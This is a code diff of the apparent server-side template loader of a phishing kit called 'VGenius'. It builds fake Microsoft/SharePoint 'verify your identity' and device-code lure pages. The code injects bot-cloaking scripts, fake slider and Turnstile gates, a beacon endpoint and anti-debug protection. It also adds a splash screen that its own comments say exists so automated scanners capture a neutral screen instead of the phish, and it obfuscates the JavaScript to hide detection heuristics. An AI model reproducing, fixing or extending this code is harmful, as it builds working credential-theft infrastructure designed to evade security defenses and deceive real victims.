@@ -1,8 +1,3 @@
-/**
- * VGenius Template Loader Service
- * Encrypts exported templates using AES-GCM
- * Keeps heavy XOR obfuscation for JavaScript engines.
- */
 'use strict';
 
 const fs = require('fs');
@@ -70,7 +65,6 @@ function resolveTemplateDirectory(templateType) {
     const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
     if (fs.existsSync(dp)) return dp;
 
-    // If the configured default template directory is missing, fall back to an existing template.
     const preferredFallback = candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint4')
         || candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint2')
         || candidateDirs[0];
@@ -85,7 +79,7 @@ function loadTemplateConfig(templateType) {
     return { name: templateType, preload: true, auth_mode: 'devicecode', fields: [] };
 }
 
-// Helper: Get default value for a field from template config
+
 function getConfigDefault(templateConfig, key, fallback) {
     if (!templateConfig || !templateConfig.fields) return fallback;
     var field = templateConfig.fields.find(function(f) { return f.key === key; });
@@ -108,10 +102,7 @@ function loadTemplateJS(tt) {
 }
 
 function loadVerificationDesignCSS(designName) {
-    // Resolve case-insensitively. The DB stores display names such as "Slider"
-    // while the file on disk is "slider.css"; on a case-sensitive filesystem
-    // (Linux VPS) the single-case lookup silently fell back to outlook.css, so
-    // the wrong design's CSS was served.
+
     const name = String(designName || 'outlook').trim();
     const bn = name.toLowerCase();
     const candidates = [
@@ -126,18 +117,6 @@ function loadVerificationDesignCSS(designName) {
     return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
 
-// ─── Inject a block immediately after the document's REAL <body> ──────────
-// vg-engine.js is injected into <head> and its source contains a literal
-// "<body>" inside a document.write() string (the fake-document redirect
-// helper in templates/assets/vg-engine.js). A regex such as
-// /<body[^>]*>/ig therefore matches the ENGINE's <body> first, splicing the
-// injected block into that JavaScript string. That silently corrupts the
-// vg-engine blob, which makes the exact-match replacement in the
-// obfuscation stage fail and forces the dangerous
-// /<script[^>]*>[\s\S]*?<\/script>/ig fallback that rewrote the wrong
-// script block. Start the search AFTER </head> so only the document's real
-// body is ever matched. Returns the updated HTML, or null when no real body
-// was found and nothing was inserted.
 function insertAfterRealBody(html, block) {
     if (!block) return null;
     const headEnd = html.lastIndexOf('</head>');
@@ -145,30 +124,10 @@ function insertAfterRealBody(html, block) {
     const m = /<body[^>]*>/i.exec(html.substring(searchFrom));
     if (!m) return null;
     const insertAt = searchFrom + m.index + m[0].length;
-    // slice() rather than String.replace(): a string replacement treats
-    // $&, $`, $', $$ as substitution patterns, which corrupts any block that
-    // happens to contain them.
     return html.slice(0, insertAt) + block + html.slice(insertAt);
 }
 
-// ─── Inject a block immediately BEFORE the document's REAL </body> ────────
-// The mirror of insertAfterRealBody() above, and it exists for exactly the
-// same reason: html.replace('</body>', block + '</body>') matches the FIRST
-// "</body>" in the string, and vg-engine.js - which is injected into <head> -
-// contains a literal "<body></body>" inside its showWhitePage()
-// document.write() string. So the block was being spliced INTO that
-// JavaScript string instead of into the document body.
-//
-// That is not cosmetic. The injected block is a <script> tag, so its
-// "</script>" landed inside the engine's single-quoted string UNESCAPED. The
-// browser's HTML tokenizer ends the enclosing <script> element at that
-// "</script>", so the rest of vg-engine.js was dumped into the page as
-// visible text and every listener registered after that point never ran.
-// Observed symptom: the served page had 9 "<script" but only 8 "</script>",
-// and the beacon script never fired.
-//
-// Start the search after the LAST </head> so only the document's real body
-// can match. Returns the updated HTML, or null when no real body was found.
+
 function insertBeforeRealBodyClose(html, block) {
     if (!block) return null;
     const headEnd = html.lastIndexOf('</head>');
@@ -178,18 +137,15 @@ function insertBeforeRealBodyClose(html, block) {
     return html.slice(0, idx) + block + html.slice(idx);
 }
 
-// ─── Load Verification Design HTML+JS (for .html designs like SLIDER.html) ──
 function loadVerificationDesignHTML(designName) {
     const bn = String(designName || '').trim().toLowerCase();
     
-    // Check for .html verification design files (e.g., SLIDER.html)
     const htmlCandidates = [
         path.join(DESIGNS_DIR, bn + '.html'),
         path.join(DESIGNS_DIR, bn.replace(/\.html$/, '.html')),
         path.join(DESIGNS_DIR, bn.charAt(0).toUpperCase() + bn.slice(1) + '.html'),
     ];
     
-    // Also check case-insensitive variations
     if (bn === 'slider') {
         htmlCandidates.push(path.join(DESIGNS_DIR, 'SLIDER.html'));
         htmlCandidates.push(path.join(DESIGNS_DIR, 'slider.html'));
@@ -205,10 +161,7 @@ function loadVerificationDesignHTML(designName) {
         if (fs.existsSync(fp)) {
             console.log('[Templateloader] Found verification design HTML:', fp);
             const content = fs.readFileSync(fp, 'utf8');
-            // Extract <style> content
             const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
-            // Extract <script> content. A design may carry several blocks, so
-            // concatenate them all instead of only capturing the first one.
             const scriptTags = content.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi) || [];
             const js = scriptTags
                 .map(function (tag) {
@@ -218,16 +171,6 @@ function loadVerificationDesignHTML(designName) {
                 .filter(Boolean)
                 .join('\n');
 
-            // Extract HTML body content (between <body> and </body>).
-            //
-            // <script> tags are STRIPPED here. The same code is delivered exactly
-            // once, separately, by buildSliderOverlay() via chainJs. Leaving the
-            // tags in made the design script execute twice: the first run fired
-            // while the browser was still parsing layer 1, i.e. before the
-            // stylesheet block was applied, so clientWidth measured an
-            // unstyled box, maxTranslate computed negative and
-            // `translate > maxTranslate * 0.85` was true on the very first 1px
-            // of drag - the slider "verified" with no real drag at all.
             const bodyMatch = content.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
             const html = bodyMatch
                 ? bodyMatch[1]
@@ -246,7 +189,6 @@ function loadVerificationDesignHTML(designName) {
     }
     
     console.log('[Templateloader] No verification design HTML found for:', bn);
-    // No HTML design found
     return { css: '', js: '', html: '', hasHtml: false };
 }
 
@@ -371,19 +313,6 @@ function boolSetting(v) {
     return String(v || '').toLowerCase() === 'true';
 }
 
-// ─── JS Obfuscation (SINGLE-STAGE for browser performance) ──
-// Two-stage was causing browser hangs due to 3MB+ output
-// This single-stage approach is lighter but still effective
-//
-// options.workersSafe: required for code that runs in the Cloudflare
-// Workers runtime (the worker wrapper bundle). The Workers runtime has NO
-// `window` global, and with disableConsoleOutput/selfDefending enabled,
-// javascript-obfuscator emits a top-level shim of the form
-//     ...;_0x1de4b5=_0x2cfcbe();}catch(_0x34f1b6){_0x1de4b5=window;}
-// which throws "Uncaught ReferenceError: window is not defined" the moment
-// Cloudflare instantiates the module - so the whole script upload is
-// rejected and the link deployment fails. Browser-only code (the page
-// scripts) keeps the full option set.
 function obfuscateJs(sourceCode, options) {
     try {
         const JavaScriptObfuscator = require('javascript-obfuscator');
@@ -391,37 +320,33 @@ function obfuscateJs(sourceCode, options) {
 
         console.log('[Obfuscation] Single-stage obfuscation' + (workersSafe ? ' (workers-safe)' : '') + '...');
         const result = JavaScriptObfuscator.obfuscate(sourceCode, {
-            compact: true,                     // Minify
-            controlFlowFlattening: true,       // Flatten control flow
-            controlFlowFlatteningThreshold: 0.5, // Apply to 50% of code (not all)
-            deadCodeInjection: false,          // Disabled - causes bloat
+            compact: true,             
+            controlFlowFlattening: true,     
+            controlFlowFlatteningThreshold: 0.5, 
+            deadCodeInjection: false,      
             deadCodeInjectionThreshold: 0,
-            debugProtection: false,            // Disabled - causes browser hangs
+            debugProtection: false,        
             debugProtectionInterval: 0,
-            // Browsers only - the shim's catch branch assigns `window`,
-            // which does not exist in the Workers runtime.
             disableConsoleOutput: !workersSafe,
             identifierNamesGenerator: 'hexadecimal',
-            renameGlobals: false,              // Keep globals intact
-            // Browsers only - self-defending wraps the module in a
-            // browser-oriented integrity check; keep Workers output lean.
+            renameGlobals: false,          
             selfDefending: !workersSafe,
             stringArray: true,
             stringArrayCallsTransform: true,
-            stringArrayEncoding: ['rc4'],      // RC4 encoding only
+            stringArrayEncoding: ['rc4'], 
             stringArrayIndexShift: true,
             stringArrayRotate: true,
             stringArrayShuffle: true,
-            stringArrayWrappersCount: 2,       // Moderate wrappers
+            stringArrayWrappersCount: 2,       
             stringArrayWrappersChainedCalls: false,
             stringArrayWrappersParametersMaxCount: 2,
             stringArrayWrappersType: 'variable',
-            transformObjectKeys: false,        // Disabled - can break code
+            transformObjectKeys: false,        
             unicodeEscapeSequence: true,
-            numbersToExpressions: false,       // Disabled - causes bloat
-            simplify: true,                    // Simplify
+            numbersToExpressions: false,     
+            simplify: true,                 
             splitStrings: true,
-            splitStringsChunkLength: 8,        // Moderate chunk size
+            splitStringsChunkLength: 8,      
         });
 
         const finalCode = result.getObfuscatedCode();
@@ -434,10 +359,6 @@ function obfuscateJs(sourceCode, options) {
     }
 }
 
-// Distinguish a real per-link Turnstile site key from the env fallback.
-// An empty or placeholder key means the widget will not render, and vg-engine
-// will fall through to "Turnstile not enabled" and reveal the protected page
-// with no challenge. Log it loudly so this is never a silent no-op again.
 function reportTurnstileKey(key, linkId, ctx) {
     const k = String(key || '').trim();
     if (!k) {
@@ -447,8 +368,7 @@ function reportTurnstileKey(key, linkId, ctx) {
         console.warn('[Templateloader] ' + ctx + ': Turnstile site key for link ' + linkId +
             ' is a placeholder ("' + k + '") - the challenge will NOT render.');
     } else {
-        // Prefix only - a sitekey is a public identifier, but there is no reason
-        // to print it in full on every render.
+
         console.log('[Templateloader] ' + ctx + ': link ' + linkId + ' resolved site key ' +
             k.substring(0, 16) + '...' + k.length + ' chars');
     }
@@ -459,9 +379,6 @@ async function buildWindowVars(link, user, settings, options) {
     options = options || {};
     const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
     const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
-    // Anti-debug is ON by default. Honor an explicit operator choice, but if the
-    // setting has never been written (null/undefined) default to enabled rather
-    // than silently leaving devtools detection off on every page.
     const antidebugEnabled = settings.antidebug_enabled != null ? boolSetting(settings.antidebug_enabled) : true;
     const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
     const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
@@ -469,7 +386,6 @@ async function buildWindowVars(link, user, settings, options) {
     const bgUrl = link.custom_bg_url || link.background_blur_url || '';
     const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
     const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
-    // Per-link Turnstile site key (Widget Pool) — fallback to global env
     let turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
     try {
         const turnstilePool = require('./turnstile-pool');
@@ -482,9 +398,7 @@ async function buildWindowVars(link, user, settings, options) {
     }
     reportTurnstileKey(turnstileSiteKey, link && link.id, 'buildWindowVars');
     var apiBase = '';
-    // relativeApi = worker-served page: keep __API_BASE empty so vg-engine.js
-    // falls back to window.location.origin (the worker). Never bake an absolute
-    // domain here - see the relativeApi note in renderPageHtml().
+
     if (!options.relativeApi && options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
     else if (!options.relativeApi && config.API_URL) apiBase = String(config.API_URL).trim().replace(/\/+$/, '');
     else if (!options.relativeApi && config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
@@ -551,11 +465,7 @@ function obfuscateTextContent(html) {
     // FIX: Wrap in DOMContentLoaded to ensure spans exist before decoding
     var decodeScript = '<scr' + 'ipt>(function(){function d(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var spans=document.querySelectorAll("span.__vg");for(var i=0;i<spans.length;i++){var idx=parseInt(spans[i].getAttribute("data-idx"));if(D[idx]!==undefined){spans[i].textContent=D[idx];spans[i].className="";spans[i].removeAttribute("data-idx")}}};if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",d);}else{d();}})();</scr' + 'ipt>';
 
-    // FIX: Place decode script at end of body, not in head.
-    // insertBeforeRealBodyClose() rather than replace('</body>', ...): the
-    // engine's document.write() string contains its own "</body>" inside
-    // <head>, so a plain replace() spliced the decode script into that
-    // JavaScript string instead of the document body.
+
     const htmlWithDecode = insertBeforeRealBodyClose(html, decodeScript);
     if (htmlWithDecode) {
         html = htmlWithDecode;
@@ -569,29 +479,8 @@ function obfuscateTextContent(html) {
 }
 
 // ─── Scope Verification Design CSS ─────────────────────────
-// Design files such as verification-designs/SLIDER.html are standalone pages and
-// therefore ship top-level global rules:
-//
-//     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-//     :root { --sp-blue: ...; }
-//     body  { display: flex; align-items: center; justify-content: center; ... }
-//     .card { max-width: 420px; ... }
-//     h1 { ... }  p { ... }
-//
-// Injecting them unscoped into a template page is destructive: the style block
-// lands after <body>, i.e. AFTER the template's own <style> in <head>, so at
-// equal specificity the design wins everywhere. `body{display:flex}` redeclares
-// `display` without `flex-direction`, which resets it to `row` and pushes the
-// template's topbar/card side by side; `.card{max-width:420px}` collapses the
-// whole form; `:root` swaps every --sp-* token.
-//
-// This rewrites every selector to be relative to the slider layer element, so
-// the design can only ever paint inside its own overlay. Nested @media blocks
-// are recursed; @keyframes / @font-face bodies are emitted verbatim.
 function scopeVerificationCss(css, scopeId) {
     var scope = '#' + scopeId;
-    // Document-level selectors map onto the layer element itself. Custom props
-    // declared there cascade down to the design's descendants as intended.
     var GLOBAL_TO_SCOPE = {
         '*': scope + ', ' + scope + ' *',
         '*::before': scope + '::before, ' + scope + ' *::before',
@@ -613,15 +502,12 @@ function scopeVerificationCss(css, scopeId) {
     }
 
     function walk(src) {
-        // CSS comments may contain braces and would break the brace walk.
         src = src.replace(/\/\*[\s\S]*?\*\//g, '');
         var out = [];
         var i = 0;
         while (i < src.length) {
             while (i < src.length && /\s/.test(src.charAt(i))) i++;
             if (i >= src.length) break;
-
-            // Scan to the '}' that closes this top-level rule, counting nesting.
             var depth = 0, open = -1, close = -1;
             for (var j = i; j < src.length; j++) {
                 var ch = src.charAt(j);
@@ -633,7 +519,7 @@ function scopeVerificationCss(css, scopeId) {
                     if (depth === 0) { close = j; break; }
                 }
             }
-            if (open === -1 || close === -1) break; // malformed input - stop
+            if (open === -1 || close === -1) break; 
 
             var header = src.substring(i, open).trim();
             var body = src.substring(open + 1, close);
@@ -655,24 +541,18 @@ function scopeVerificationCss(css, scopeId) {
 }
 
 // ─── Build Slider Overlay HTML ─────────────────────────────
-// Builds the slider verification HTML+CSS+JS to inject into the page.
-// Uses SLIDER.html file content if available, otherwise generates default.
-// The slider appears FIRST (full screen overlay), then Cloudflare in the SAME block.
 function buildSliderOverlay(sliderData, link, obfuscate = false) {
-    // Layer 1: Slider (visible on page load)
-    // Use sliderData.html if available (from SLIDER.html file)
+
     let layer1Html = '';
     
     if (sliderData && sliderData.hasHtml && sliderData.html) {
-        // Use the HTML from SLIDER.html file
-        // Wrap it in a container div with id="vgSliderLayer"
+
         layer1Html = `
 <!-- ===== LAYER 1: SLIDER from SLIDER.html (visible on page load) ===== -->
 <div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
     ${sliderData.html}
 </div>`;
     } else {
-        // Fallback: Generate default slider HTML
         layer1Html = `
 <!-- ===== LAYER 1: SLIDER (visible on page load) ===== -->
 <div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
@@ -691,7 +571,6 @@ function buildSliderOverlay(sliderData, link, obfuscate = false) {
 </div>`;
     }
 
-    // Layer 2: Cloudflare Turnstile (hidden until slider done)
     const layer2Html = `
 <!-- ===== LAYER 2: CLOUDFLARE TURNSTILE (hidden until slider done) ===== -->
 <div id="vgCfLayer" style="display:none;position:fixed;inset:0;z-index:99998;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;align-items:center;justify-content:center;padding:24px 16px;">
@@ -708,33 +587,30 @@ function buildSliderOverlay(sliderData, link, obfuscate = false) {
     </div>
 </div>`;
 
-    // Use CSS from SLIDER.html if available
+
     let cssContent = '';
     if (sliderData && sliderData.hasHtml && sliderData.css) {
         // Scope to the layer - see scopeVerificationCss() for why this is required.
         cssContent = scopeVerificationCss(sliderData.css, 'vgSliderLayer');
     } else {
-        // Fallback default CSS
+
         cssContent = `
         #vgSliderContainer.vg-verifying #vgSliderHandle { background: #0B6A0B !important; cursor: default; }
         #vgSliderContainer.vg-verifying svg { color: #fff !important; }`;
     }
 
-    // Add Turnstile spinner CSS
+
     cssContent += `
     @keyframes vgSpin { to { transform: rotate(360deg); } }`;
 
     const styleHtml = `<style>${cssContent}</style>`;
 
-    // Build the slider JavaScript
-    // Use JS from SLIDER.html if available
+
     let sliderJs = '';
     if (sliderData && sliderData.hasHtml && sliderData.js) {
-        // Use JavaScript from SLIDER.html file
-        // The SLIDER.html JS already calls window.__vgOnSliderComplete() after verification
         sliderJs = sliderData.js;
     } else {
-        // Fallback: Generate default slider JavaScript
+
         sliderJs = `
 (function(){
     'use strict';
@@ -848,44 +724,29 @@ function buildSliderOverlay(sliderData, link, obfuscate = false) {
 })();`;
     }
 
-    // Obfuscate the slider JS if requested
     let finalSliderJs = sliderJs;
     if (obfuscate && sliderJs.length > 100) {
         try {
             finalSliderJs = obfuscateJs(sliderJs);
-            // Escape </script> and </style> sequences so they don't terminate
-            // the enclosing <script> tag. \/ is equivalent to / inside JS strings.
             finalSliderJs = finalSliderJs.replace(/<\/script/gi, '<\\/script')
                                           .replace(/<\/style/gi, '<\\/style');
             console.log('[Templateloader] Slider overlay obfuscated successfully');
         } catch (e) {
             console.error('[Templateloader] Slider overlay obfuscation failed:', e && e.message);
-            finalSliderJs = sliderJs; // Fallback to unobfuscated
+            finalSliderJs = sliderJs;
         }
     } else {
-        // Even without obfuscation, escape any </script> in the raw slider JS
-        // so it doesn't terminate the enclosing <script> tag.
+
         finalSliderJs = sliderJs.replace(/<\/script/gi, '<\\/script')
                                 .replace(/<\/style/gi, '<\\/style');
     }
 
-    // Completion contract. Design scripts only call window.__vgOnSliderComplete();
-    // they never signal readiness themselves. Seeding these globals makes the
-    // engine's recovery polls in initSliderChainHandler() actually work for
-    // file-based designs - previously they only held true for the fallback, so
-    // the "slider already completed before the engine loaded" path was inert.
     const contractJs =
         'window.__vgSliderVerified = window.__vgSliderVerified === true;' +
         'window.__vgCheckSliderReady = function(){ return window.__vgSliderVerified === true; };';
 
     const chainJs = '<script>' + contractJs + '\n' + finalSliderJs + '<\/script>';
 
-    // Combine all layers.
-    //
-    // The stylesheet comes FIRST: it must be parsed before the design script
-    // runs, otherwise clientWidth is measured against an unstyled box,
-    // maxTranslate computes negative and the 85% threshold trips on the first
-    // pixel of drag.
     const fullHtml = `
 <!-- ═══════════════════════════════════════════════════
      SLIDER → CLOUDFLARE VERIFICATION CHAIN
@@ -901,26 +762,6 @@ ${chainJs}`;
 }
 
 // ─── Pre-verification splash (first-paint) ──────────────────
-//
-// Renders a generic branded loading screen before the verification chain.
-// Automated scanners that screenshot early capture this instead of the
-// verification UI. The phish content and slider remain underneath; nothing
-// here destroys the page DOM, and the splash adds to body length rather than
-// removing from it, so vg-engine's integrity check cannot be tripped by it.
-//
-// Deliberately NOT wired into vg-engine. The splash covers everything, then
-// fades on its own timer. The slider and Turnstile load underneath it and
-// keep running — vg-engine has no pre-Turnstile timeout that would reveal the
-// page while the splash is up (the 180s timeout now forces the failure state
-// instead of revealing), so no handshake is required.
-//
-// Deliberately NOT using CSP. 'frame-src' would block
-// challenges.cloudflare.com, which Turnstile renders into. 'frame-ancestors'
-// is ignored when delivered via <meta> and only works as an HTTP header.
-//
-// Obfuscate flag must stay false for the same reason buildSliderOverlay
-// uses it: obfuscation can corrupt the string escaping required to embed
-// browser code inside a <script> block in the template HTML.
 function buildSplashOverlay(config, link, obfuscate = false) {
     const splashBrand = (config && config.name) || (link && link.name) || 'Workspace';
     const logoInitial = String(splashBrand).charAt(0).toUpperCase();
@@ -1054,10 +895,6 @@ async function renderPageHtml(link, user, options) {
     console.log('  link.template_type:', link.template_type);
     console.log('[Templateloader] ═══ END SLIDER DETECTION ═══');
 
-    // {{CSS}} / {{SCRIPT}} may appear bare or comment-wrapped (/* {{CSS}} */).
-    // The old code guarded on .includes('{{CSS}}') but only replaced the
-    // comment-wrapped form, so a bare marker passed the guard, was not replaced,
-    // and the literal "{{CSS}}" text shipped to the client.
     if (html.includes('{{CSS}}')) {
         html = html.replace(/\/\*\s*\{\{CSS\}\}\s*\*\/|{{CSS}}/g, css);
     }
@@ -1065,17 +902,13 @@ async function renderPageHtml(link, user, options) {
         html = html.replace(/\/\/\s*\{\{SCRIPT\}\}|{{SCRIPT}}/g, script);
     }
 
-    // Use template config defaults as fallbacks, then link overrides
+
     html = html.replace('{{TITLE}}', link.title_text || getConfigDefault(templateConfig, 'title', 'Verify your identity'));
     html = html.replace('{{MESSAGE}}', link.message_text || getConfigDefault(templateConfig, 'message', 'Please verify your identity to continue'));
     html = html.replace('{{BUTTON_TEXT}}', link.button_text || getConfigDefault(templateConfig, 'button_text', 'Get verification code'));
     html = html.replace('{{FILE_NAME}}', link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf'));
     html = html.replace('{{PAGES}}', String(link.pages || getConfigDefault(templateConfig, 'pages', 1)));
 
-    // relativeApi (worker-served pages) forces empty endpoints so the page
-    // resolves /api/* against its own origin - the worker, which proxies to the
-    // backend. Anything baked here absolute would pin the page to a domain that
-    // may not resolve. Otherwise the export/live default applies.
     const verifyUrl = (options.relativeApi ? '' : (options.apiBaseUrl || config.API_URL || config.APP_URL || '')).trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
     const logUrl = verifyUrl;
@@ -1104,9 +937,6 @@ async function renderPageHtml(link, user, options) {
         vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
     }
 
-    // vg-fingerprint.js runs BEFORE vg-engine so the browser's canvas/WebGL/
-    // DOM-tamper state is checked before the verification UI is visible.
-    // vg-behavior.js loads the mouse/keyboard trackers used by the slider gate.
     var vgFingerprint = '';
     const vgFingerprintPath = path.join(TEMPLATES_DIR, 'assets', 'vg-fingerprint.js');
     if (fs.existsSync(vgFingerprintPath)) {
@@ -1118,10 +948,6 @@ async function renderPageHtml(link, user, options) {
         vgBehavior = fs.readFileSync(vgBehaviorPath, 'utf8');
     }
 
-    // vg-cloak.js runs FIRST of all runtime modules: it decides whether the
-    // visitor is a bot before anything else touches the DOM, and wipes the page
-    // to a blank white sheet for bots. The other modules (fingerprint, behavior,
-    // engine) then simply never get a chance to paint branded content.
     var vgCloak = '';
     const vgCloakPath = path.join(TEMPLATES_DIR, 'assets', 'vg-cloak.js');
     if (fs.existsSync(vgCloakPath)) {
@@ -1131,13 +957,11 @@ async function renderPageHtml(link, user, options) {
     const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
     const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
     
-    // Add slider design flag for vg-engine.js (must be boolean, not string)
+
     const sliderFlag = '<script>window.__SLIDER_DESIGN=' + String(isSliderDesign) + '</script>';
 
     // Assemble the whole runtime bootstrap in one place.
     var headScripts = windowVars + configScript + sliderFlag;
-    // Cloak first, so a bot is wiped before the fingerprint/behavior/engine
-    // modules (or the template's own scripts) can render anything.
     if (vgCloak) {
         headScripts += '<script>' + vgCloak + '</script>';
     }
@@ -1154,37 +978,16 @@ async function renderPageHtml(link, user, options) {
         headScripts += '<script>' + vgEngine + '</script>';
     }
 
-    // Prefer </head>. Custom/user-uploaded templates may have no <head> block;
-    // the old code used html.replace('</head>', ...) which silently does nothing
-    // in that case - the window vars, the slider flag AND vg-engine.js were all
-    // discarded at once, producing a page with no engine and no slider hand-off.
     if (html.includes('</head>')) {
-        // split/join rather than String.replace(): a string replacement treats
-        // $&, $`, $', $$ as substitution patterns, and vg-engine.js is 85KB.
         html = html.split('</head>').join(headScripts + '</head>');
         console.log('[Templateloader] Runtime scripts injected before </head>');
     } else {
-        // No </head> to anchor on. insertBeforeRealBodyClose() still searches
-        // from the end of the document outward and ignores the engine's
-        // embedded "<body>" string, so use it rather than a /<body[^>]*>/i
-        // regex that would match that string first.
+
         const htmlWithHead = insertBeforeRealBodyClose(html, headScripts);
         html = htmlWithHead || (html + headScripts);
         console.warn('[Templateloader] No </head> found - injected runtime scripts at the end of <body>');
     }
 
-    // ═══════════════════════════════════════════
-    // NOTE: no CSP meta here. 'frame-ancestors' is ignored when delivered
-    // via <meta> (browsers only honour it as an HTTP header), and 'frame-src'
-    // would block challenges.cloudflare.com - which Turnstile requires in an
-    // iframe. A CSP that blocks screenshot iframes necessarily blocks the
-    // Turnstile widget too. First-paint protection is handled by the splash
-    // overlay instead, which cannot break the verification chain.
-    // ═══════════════════════════════════════════
-    
-    // ═══════════════════════════════════════════
-    // DIAGNOSTICS: Check HTML structure
-    // ═══════════════════════════════════════════
     console.log('[Templateloader] ═══ HTML DIAGNOSTICS ═══');
     console.log('  Total HTML length:', html.length);
     console.log('  Contains <html>:', html.includes('<html>'));
@@ -1226,11 +1029,7 @@ async function renderPageHtml(link, user, options) {
     // Check if obfuscation is enabled (needed for slider overlay)
     const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
 
-    // ═══════════════════════════════════════════
-    // INJECT SLIDER OVERLAY (if slider design selected)
-    // For live pages: inject right after <body> tag
-    // For export mode: inject AFTER encryption (below)
-    // ═══════════════════════════════════════════
+
     if (isSliderDesign && !options.exportForDownload) {
         console.log('[Templateloader] Injecting slider overlay for design:', designName);
         console.log('[Templateloader] Slider data: hasHtml=' + sliderData.hasHtml + 
@@ -1252,14 +1051,6 @@ async function renderPageHtml(link, user, options) {
         }
     }
 
-    // ═══════════════════════════════════════════
-    // INJECT PRE-VERIFICATION SPLASH (all designs)
-    // First-paint delay so automated screenshot scanners capture a generic
-    // branded loading screen instead of the verification UI. z-index sits
-    // above the slider/CF layers, so nothing is visible underneath until it
-    // fades. Applied to every design — a phishing page with no preload also
-    // benefits from a neutral first paint.
-    // ═══════════════════════════════════════════
     if (!options.exportForDownload) {
         const splashOverlay = buildSplashOverlay(templateConfig, link, doObfuscate);
         const withSplash = insertAfterRealBody(html, splashOverlay);
@@ -1272,20 +1063,12 @@ async function renderPageHtml(link, user, options) {
         }
     }
 
-    // ═══════════════════════════════════════════
-    // OBSTRUCTION: Obfuscate JS if enabled
-    // ═══════════════════════════════════════════
     if (doObfuscate) {
-        // Escape </script> and </style> in obfuscated JS so the browser's script tag parser
-        // doesn't terminate the enclosing <script> tag prematurely. Inside JS string
-        // literals, \/ is equivalent to /, so this is semantically identical but safe
-        // to embed inside a <script>...</script> block.
+
         function safeEmbedJs(js) {
             return js.replace(/<\/script/gi, '<\\/script')
                     .replace(/<\/style/gi, '<\\/style');
         }
-        // Obfuscate vg-cloak.js (injected before vg-engine; obfuscate it the
-        // same way so the bot-detection heuristics are not readable plaintext).
         if (vgCloak && vgCloak.length > 500) {
             try {
                 const obfuscatedCloak = safeEmbedJs(obfuscateJs(vgCloak));
@@ -1375,10 +1158,7 @@ async function renderPageHtml(link, user, options) {
                 console.log('[Templateloader] DEBUG inline script after safeEmbedJs: length=' + obfuscatedScript.length +
                             ', stray </script>=' + inlineStrayClose +
                             ', stray <script=' + inlineStrayOpen);
-                
-                // FIX: Instead of using a generic regex that matches the first <script> block,
-                // find the specific <script> block that contains the inline script content.
-                // This prevents accidentally replacing the slider overlay or vg-engine blocks.
+            
                 
                 // Method 1: Exact match (fastest)
                 const originalScriptBlock = '<script>' + script + '</script>';
@@ -1408,8 +1188,6 @@ async function renderPageHtml(link, user, options) {
                             console.warn('[Templateloader] ⚠️ Inline script: found script content but no <script> tag - skipping replacement');
                         }
                     } else {
-                        // Script content not found in HTML - this means the template loads JS externally
-                        // DO NOT use fallback regex - it would replace the wrong <script> block!
                         console.warn('[Templateloader] ⚠️ Inline script: script content not found in HTML');
                         console.warn('[Templateloader] ⚠️ Template likely loads JS externally (via <script src="...">)');
                         console.warn('[Templateloader] ⚠️ Skipping inline script obfuscation to prevent HTML corruption');
@@ -1422,21 +1200,6 @@ async function renderPageHtml(link, user, options) {
         }
     }
 
-    // ═══════════════════════════════════════════
-    // POST-OBFUSCATION SAFETY CHECK: verify no </script>
-    // leaks from obfuscated JS into the enclosing
-    // <script>...</script> block.
-    //
-    // IMPORTANT: This scanner MUST match the browser's
-    // script tag parser behavior. The browser does NOT
-    // track nested <script> tags inside a script block.
-    // It only looks for the FIRST </script> after the
-    // opening <script> to end the script block.
-    //
-    // So we do the same: find <script, then find the
-    // next </script> after it. Anything between them
-    // is part of the script block.
-    // ═══════════════════════════════════════════
     {
         let idx = 0;
         let leakCount = 0;
@@ -1456,9 +1219,7 @@ async function renderPageHtml(link, user, options) {
                 break;
             }
             
-            // Check if there's another </script> INSIDE the script block
-            // (before the actual closing tag). This would be a leak.
-            let innerSearch = nextOpen + 7; // Skip past "<script"
+            let innerSearch = nextOpen + 7; 
             let innerClose = -1;
             while (innerSearch < scriptEnd) {
                 const potentialClose = html.toLowerCase().indexOf('</script>', innerSearch);
@@ -1494,10 +1255,6 @@ async function renderPageHtml(link, user, options) {
         }
     }
 
-    // ═══════════════════════════════════════════
-    // CLEANUP: Replace any remaining placeholders BEFORE encryption
-    // ═══════════════════════════════════════════
